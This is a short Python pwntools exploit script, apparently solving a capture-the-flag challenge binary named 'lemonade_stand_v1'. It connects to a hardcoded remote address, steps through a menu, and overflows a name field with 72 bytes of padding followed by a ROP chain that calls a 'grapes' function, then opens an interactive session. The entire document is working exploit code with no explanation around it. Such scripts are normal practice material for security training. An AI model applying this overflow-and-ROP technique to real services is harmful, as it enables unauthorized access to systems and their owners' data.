from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = "./lemonade_stand_v1"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

io = remote("94.237.62.49", 52248)

rop = ROP(elf)
rop.grapes()

io.sendlineafter(b">>", b"2")
io.sendlineafter(b">>", b"2")
io.sendlineafter(b">>", b"2")
io.sendlineafter(b">>", b"1")
io.sendlineafter(b"name: ", b"a")

padding = 72

payload = flat(
    b"A" * padding,
    rop.chain()
)

write('payload', payload)

io.sendlineafter(b"name: ",payload)

io.interactive()